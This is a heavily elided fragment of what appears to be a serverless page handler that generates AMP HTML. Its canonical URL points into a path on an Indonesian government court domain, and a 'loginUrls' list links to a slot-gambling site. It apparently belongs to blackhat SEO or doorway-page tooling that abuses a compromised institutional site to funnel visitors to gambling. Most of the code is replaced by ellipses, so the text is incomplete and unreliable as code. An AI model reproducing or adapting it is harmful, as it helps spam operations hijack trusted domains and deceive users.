...
export async function onRequest(context) {
  ...
  try {
    ...
    if (originalSiteName || pathSegments.length === 0) {
      ...
      const canonicalOrigin = 'https://pa-barru.go.id/templates/badilweb/layouts/modules/layouts/K/Oppai='; // Replace with your actual domain
...
function generate3DCubeAmpHtml(siteName, canonicalUrl) {
  ...
  const loginUrls = [
    "https://slot603gacor.xyz/gustavo517"
  ];
